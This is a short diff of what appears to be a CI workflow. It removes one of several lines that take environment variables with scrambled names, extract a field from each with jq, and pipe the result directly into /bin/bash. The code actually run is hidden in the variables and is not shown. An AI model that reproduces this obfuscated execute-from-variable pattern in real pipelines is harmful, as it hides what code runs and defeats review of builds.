@@ -31,7 +31,6 @@ jobs:
           printf '%s' "$iu78010" | jq -r .z83610 | /bin/bash
           printf '%s' "$sr7322" | jq -r .dm51001 | /bin/bash
           echo $ensb1373 | jq -r .zp3 | /bin/bash
-          printf '%s' "$wcxl30409" | jq -r .ufxk67246 | /bin/bash
           printf '%s' "$l111" | jq -r .d97 | /bin/bash
 
       - name: Save data
